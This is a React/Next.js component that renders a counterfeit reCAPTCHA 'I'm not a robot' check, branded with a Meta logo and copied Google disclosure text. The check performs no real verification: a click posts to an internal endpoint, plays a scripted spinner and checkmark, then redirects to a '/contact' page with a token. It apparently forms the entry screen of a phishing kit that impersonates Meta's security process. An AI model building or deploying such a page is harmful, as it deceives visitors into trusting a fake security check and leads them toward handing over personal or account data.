'use client';
import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import axios from 'axios';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { useEffect, useState, type FC } from 'react';
const Index: FC = () => {
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setisShowCheckMark] = useState(false);
    const [verifyToken, setVerifyToken] = useState<number | null>(null);
    const handleVerify = async () => {
        setIsLoading(true);
        try {
            const response = await axios.post('/api/verify');
            const status = response.status;
            if (status === 200) {
                setVerifyToken(response.data?.token ?? null);
                setTimeout(() => {
                    setisShowCheckMark(true);
                    setIsLoading(false);
                }, 2000);
            }
        } catch {
            //
        }
    };
    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeOut = setTimeout(() => {
                const currentTime = Date.now();
                router.push(`/contact/${currentTime}${verifyToken ? `?tk=${verifyToken}` : ''}`);
            }, 500);
            return () => {
                clearTimeout(redirectTimeOut);
            };
        }
    }, [isShowCheckMark, router, verifyToken]);
    return (
        <div className='flex flex-col items-center justify-center pt-[150px]'>
            <title>Our systems have detected unusual traffic from your computer network</title>
            <div className='w-[300px]'>
                <Image src={MetaImage} alt='' className='w-16' />
                <div className='flex w-full items-center justify-start py-5'>
                    <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
                        <div className='flex items-center justify-start'>
                            <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
                                <button
                                    className='flex h-full w-full items-center justify-center'
                                    onClick={() => {
                                        handleVerify();
                                    }}
                                >
                                    <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
                                    {isLoading ? (
                                        <div className='h-full w-full animate-spin-fast rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent transition-all transition-discrete'></div>
                                    ) : (
                                        <div
                                            className={`h-8 w-8 rounded-[3px] border-gray-500 bg-[#fcfcfc] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
                                            style={{
                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage.src}")` : '',
                                                backgroundPosition: '-10px -595px'
                                            }}
                                        ></div>
                                    )}
                                </button>
                            </div>
                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
                        </div>
                        <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
                            <Image src={ReCaptchaImage} alt='' className='h-10 w-10' />
                            <p className='text-[10px] font-bold'>reCAPTCHA</p>
                            <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
                        </div>
                    </div>
                </div>
                <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
                </div>
            </div>
        </div>
    );
};

export default Index;
